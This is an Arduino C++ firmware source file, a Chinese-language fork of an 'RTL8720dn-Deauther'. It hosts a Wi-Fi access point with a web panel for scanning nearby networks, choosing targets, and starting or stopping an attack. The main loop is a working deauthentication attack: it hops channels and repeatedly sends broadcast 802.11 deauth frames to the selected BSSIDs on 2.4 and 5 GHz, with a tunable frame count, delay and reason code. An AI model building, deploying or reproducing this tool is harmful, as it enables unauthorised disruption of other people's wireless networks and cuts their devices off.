// ---------------------------------------------------------------------
// RTL8720dn-Deauther CN Ver.
// Forked by SerendipityR.
// ---------------------------------------------------------------------
#include "vector"
#include "wifi_conf.h"
#include "map"
#include "wifi_cust_tx.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "debug.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"

// ---------------------------------------------------------------------
// 数据结构和全局变量
// ---------------------------------------------------------------------
typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
} WiFiScanResult;

char *ssid = "RTL8720dn-Deauther";
char *pass = "0123456789";

int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
std::map<int, std::vector<int>> deauth_channels;
std::vector<int> chs_idx;
uint32_t current_ch_idx = 0;
uint32_t sent_frames = 0;

WiFiServer server(80);
uint8_t deauth_bssid[6];
uint16_t deauth_reason = 2;

int frames_per_deauth = 5;
int send_delay = 5;

bool isDeauthing = false;
bool led = true;

// ---------------------------------------------------------------------
// 扫描回调
// ---------------------------------------------------------------------
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             result.bssid[0], result.bssid[1], result.bssid[2],
             result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

// ---------------------------------------------------------------------
// 扫描函数（阻塞约5秒，但之后不再 while() 二次阻塞）
// ---------------------------------------------------------------------
int scanNetworks() {
  DEBUG_SER_PRINT("正在扫描 WiFi 网络 (5s)...\n");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    DEBUG_SER_PRINT("扫描完成!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT("扫描失败!\n");
    return 1;
  }
}

// ---------------------------------------------------------------------
// 简单的 HTTP 请求解析
// ---------------------------------------------------------------------
String parseRequest(String request) {
  int path_start = request.indexOf(' ');
  if (path_start < 0) return "/";
  path_start += 1;
  int path_end = request.indexOf(' ', path_start);
  if (path_end < 0) return "/";
  return request.substring(path_start, path_end);
}

std::vector<std::pair<String, String>> parsePost(String &request) {
    std::vector<std::pair<String, String>> post_params;
    int body_start = request.indexOf("\r\n\r\n");
    if (body_start == -1) {
        return post_params;
    }
    body_start += 4;
    String post_data = request.substring(body_start);

    int start = 0;
    int end = post_data.indexOf('&', start);
    while (end != -1) {
        String key_value_pair = post_data.substring(start, end);
        int delimiter_position = key_value_pair.indexOf('=');
        if (delimiter_position != -1) {
            String key = key_value_pair.substring(0, delimiter_position);
            String value = key_value_pair.substring(delimiter_position + 1);
            post_params.push_back({key, value});
        }
        start = end + 1;
        end = post_data.indexOf('&', start);
    }

    String key_value_pair = post_data.substring(start);
    int delimiter_position = key_value_pair.indexOf('=');
    if (delimiter_position != -1) {
        String key = key_value_pair.substring(0, delimiter_position);
        String value = key_value_pair.substring(delimiter_position + 1);
        post_params.push_back({key, value});
    }

    return post_params;
}

// ---------------------------------------------------------------------
// HTTP 响应封装
// ---------------------------------------------------------------------
String makeResponse(int code, String content_type) {
  String response = "HTTP/1.1 " + String(code) + " OK\n";
  response += "Content-Type: " + content_type + "\n";
  response += "Connection: close\n\n";
  return response;
}

String makeRedirect(String url) {
  String response = "HTTP/1.1 307 Temporary Redirect\n";
  response += "Location: " + url;
  return response;
}

// ---------------------------------------------------------------------
// 处理根页面
// ---------------------------------------------------------------------
void handleRoot(WiFiClient &client) {
  String response = makeResponse(200, "text/html") + R"(
  <!DOCTYPE html>
  <html lang="zh">
  <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>RTL8720dn-Deauther</title>
      <style>
          body {
              font-family: Arial, sans-serif;
              line-height: 1.6;
              color: #333;
              max-width: 800px;
              margin: 0 auto;
              padding: 20px;
              background-color: #f4f4f4;
          } 
          h1, h2 {
              color: #2c3e50;
          }
          table {
              width: 100%;
              border-collapse: collapse;
              margin-bottom: 20px;
          }
          th, td {
              padding: 12px;
              text-align: left;
              border-bottom: 1px solid #ddd;
          }
          th {
              background-color: #3498db;
              color: white;
          }
          tr:nth-child(even) {
              background-color: #f2f2f2;
          }
          form {
              background-color: white;
              padding: 20px;
              border-radius: 5px;
              box-shadow: 0 2px 5px rgba(0,0,0,0.1);
              margin-bottom: 20px;
          }
          input[type="submit"] {
              padding: 10px 20px;
              border: none;
              background-color: #3498db;
              color: white;
              border-radius: 4px;
              cursor: pointer;
              transition: background-color 0.3s;
          }
          input[type="submit"]:hover {
              background-color: #2980b9;
          }
      </style>
  </head>
  <body>
      <h1>RTL8720dn-Deauther</h1>

      <h2>WiFi 网络</h2>
      <form method="post" action="/deauth">
          <table>
              <tr>
                  <th>选择</th>
                  <th>序号</th>
                  <th>SSID</th>
                  <th>BSSID</th>
                  <th>信道</th>
                  <th>RSSI</th>
                  <th>频率</th>
              </tr>
  )";

  for (uint32_t i = 0; i < scan_results.size(); i++) {
    response += "<tr>";
    response += "<td><input type='checkbox' name='network' value='" + String(i) + "'></td>";
    response += "<td>" + String(i) + "</td>";
    response += "<td>" + scan_results[i].ssid + "</td>";
    response += "<td>" + scan_results[i].bssid_str + "</td>";
    response += "<td>" + String(scan_results[i].channel) + "</td>";
    response += "<td>" + String(scan_results[i].rssi) + "</td>";
    response += "<td>" + String((scan_results[i].channel >= 36) ? "5GHz" : "2.4GHz") + "</td>";
    response += "</tr>";
  }

  response += R"(
        </table>
          <p>原因代码：</p>
          <input type="text" name="reason" placeholder="输入原因代码">
          <input type="submit" value="发起攻击">
      </form>
      <h2>仪表盘</h2>
    <table>
        <tr><th>状态</th><th>当前值</th></tr>
  )";

  response += "<tr><td>攻击状态</td><td>" + String(isDeauthing ? "运行中" : "已停止") + "</th></tr>";
  response += "<tr><td>LED启用</td><td>" + String(led ? "是" : "否") + "</th></tr>";
  response += "<tr><td>已发送帧</td><td>" + String(sent_frames) + "</th></tr>";
  response += "<tr><td>发送延时</td><td>" + String(send_delay) + "</th></tr>";
  response += "<tr><td>每次发送帧数</td><td>" + String(frames_per_deauth) + "</th></tr>";

  response += R"(
    </table>
      <h2>设置</h2>
      <form method="post" action="/setframes">
          <input type="text" name="frames" placeholder="输入每次发送帧数">
          <input type="submit" value="设置每次发送帧数">
      </form>

      <form method="post" action="/setdelay">
          <input type="text" name="delay" placeholder="输入发送延时">
          <input type="submit" value="设置发送延时">
      </form>

      <form method="post" action="/rescan">
          <input type="submit" value="重新扫描网络">
      </form>

      <form method="post" action="/stop">
          <input type="submit" value="停止攻击">
      </form>

      <form method="post" action="/led_enable">
          <input type="submit" value="开启LED">
      </form>

      <form method="post" action="/led_disable">
          <input type="submit" value="关闭LED">
      </form>

      <form method="post" action="/refresh">
          <input type="submit" value="刷新页面">
      </form>

      <h2>原因代码</h2>
    <table>
        <tr><th>代码</th><th>含义</th></tr>
        <tr><td>0</td><td>保留。</td></tr>
        <tr><td>1</td><td>未指定的原因。</td></tr>
        <tr><td>2</td><td>之前的认证不再有效。</td></tr>
        <tr><td>3</td><td>因发送站点（STA）离开或已离开独立基本服务集（IBSS）或扩展服务集（ESS）而被去关联。</td></tr>
        <tr><td>4</td><td>由于不活动而被去关联。</td></tr>
        <tr><td>5</td><td>由于 WAP 设备无法处理当前所有关联的 STA，而被去关联。</td></tr>
        <tr><td>6</td><td>收到来自未认证 STA 的类别 2 帧。</td></tr>
        <tr><td>7</td><td>收到来自未关联 STA 的类别 3 帧。</td></tr>
        <tr><td>8</td><td>因发送 STA 离开或已离开基本服务集（BSS）而被去关联。</td></tr>
        <tr><td>9</td><td>请求（重新）关联的 STA 未与响应 STA 认证。</td></tr>
        <tr><td>10</td><td>由于电源能力元素中的信息不可接受而被去关联。</td></tr>
        <tr><td>11</td><td>由于支持信道元素中的信息不可接受而被去关联。</td></tr>
        <tr><td>12</td><td>因 BSS 过渡管理而被去关联。</td></tr>
        <tr><td>13</td><td>无效元素，即本标准中定义的元素，其内容不符合第 8 条规定。</td></tr>
        <tr><td>14</td><td>消息完整性码（MIC）失败。</td></tr>
        <tr><td>15</td><td>四向握手超时。</td></tr>
        <tr><td>16</td><td>组密钥握手超时。</td></tr>
        <tr><td>17</td><td>四向握手中的元素与（重新）关联请求/探测响应/信标帧不同。</td></tr>
        <tr><td>18</td><td>无效组密码。</td></tr>
        <tr><td>19</td><td>无效对等密码。</td></tr>
        <tr><td>20</td><td>无效 AKMP。</td></tr>
        <tr><td>21</td><td>不支持的 RSNE 版本。</td></tr>
        <tr><td>22</td><td>无效的 RSNE 能力。</td></tr>
        <tr><td>23</td><td>IEEE 802.1X 认证失败。</td></tr>
        <tr><td>24</td><td>由于安全策略被拒绝的密码套件。</td></tr>
    </table>
  </body>
  </html>
  )";

  client.write(response.c_str());
}

// ---------------------------------------------------------------------
// 处理 404
// ---------------------------------------------------------------------
void handle404(WiFiClient &client) {
  String response = makeResponse(404, "text/plain");
  response += "未找到页面！";
  client.write(response.c_str());
}

// ---------------------------------------------------------------------
// setup
// ---------------------------------------------------------------------
void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);

  DEBUG_SER_INIT();

  // 启动 SoftAP
  WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());

  scanNetworks();

#ifdef DEBUG
  for (size_t i = 0; i < scan_results.size(); i++) {
    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
    for (int j = 0; j < 6; j++) {
      if (j > 0) DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
  }
#endif

  server.begin();
  if (led) {
    digitalWrite(LED_R, HIGH); // 标示 Web 服务已就绪
  }
}

// ---------------------------------------------------------------------
// loop
// ---------------------------------------------------------------------
void loop() {
  WiFiClient client = server.available();
  if (client) {
    if (led) {
      digitalWrite(LED_G, HIGH);
    }

    String request;
    while (client.available()) {
      request += (char)client.read();
    }

    DEBUG_SER_PRINT(request);

    String path = parseRequest(request);
    DEBUG_SER_PRINT("\n请求路径: " + path + "\n");

    // 路由分发
    if (path == "/") {
      handleRoot(client);
    }
    else if (path == "/rescan") {
      // 这里直接返回重定向，再进行扫描，避免阻塞。
      client.write(makeRedirect("/").c_str());
      scanNetworks();  
    }
    else if (path == "/deauth") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      deauth_channels.clear();
      chs_idx.clear();
      for (auto &param : post_data) {
        if (param.first == "network") {
          int idx = String(param.second).toInt();
          int ch = scan_results[idx].channel;
          deauth_channels[ch].push_back(idx);
          chs_idx.push_back(ch);
        } else if (param.first == "reason") {
          deauth_reason = String(param.second).toInt();
        }
      }
      if (!deauth_channels.empty()) {
        isDeauthing = true;
      }
      client.write(makeRedirect("/").c_str());
    }
    else if (path == "/setframes") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      for (auto &param : post_data) {
        if (param.first == "frames") {
          int frames = String(param.second).toInt();
          frames_per_deauth = frames <= 0 ? 5 : frames;
        }
      }
      client.write(makeRedirect("/").c_str());
    }
    else if (path == "/setdelay") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      for (auto &param : post_data) {
        if (param.first == "delay") {
          int delay = String(param.second).toInt();
          send_delay = delay <= 0 ? 5 : delay;
        }
      }
      client.write(makeRedirect("/").c_str());
    }
    else if (path == "/stop") {
      deauth_channels.clear();
      chs_idx.clear();
      isDeauthing = false;
      client.write(makeRedirect("/").c_str());
    }
    else if (path == "/led_enable") {
      led = true;
      digitalWrite(LED_R, HIGH);
      client.write(makeRedirect("/").c_str());
    }
    else if (path == "/led_disable") {
      led = false;
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
      client.write(makeRedirect("/").c_str());
    }
    else if (path == "/refresh") {
      client.write(makeRedirect("/").c_str());
    }
    else {
      handle404(client);
    }

    client.stop();
    if (led) {
      digitalWrite(LED_G, LOW);
    }
  }

  // ---------------------------------------------------------------------
  // Deauth
  // ---------------------------------------------------------------------
  if (isDeauthing && !deauth_channels.empty()) {
    for (auto& group : deauth_channels) {
      int ch = group.first;
      if (ch == chs_idx[current_ch_idx]) {
        // 暂时切到目标信道
        wext_set_channel(WLAN0_NAME, ch);

        std::vector<int>& networks = group.second;

        for (int i = 0; i < frames_per_deauth; i++) {
          if (led) {
            digitalWrite(LED_B, HIGH);
          }
          for (int idx : networks) {
            memcpy(deauth_bssid, scan_results[idx].bssid, 6);
            wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
            sent_frames++;
          }
          delay(send_delay);
          if (led) {
            digitalWrite(LED_B, LOW);
          }
        }
      }
    }
    current_ch_idx++;
    if (current_ch_idx >= chs_idx.size()) {
      current_ch_idx=0;
    }
  }

  // 回到 AP 原信道（避免客户端掉线）
  wext_set_channel(WLAN0_NAME, current_channel);
}
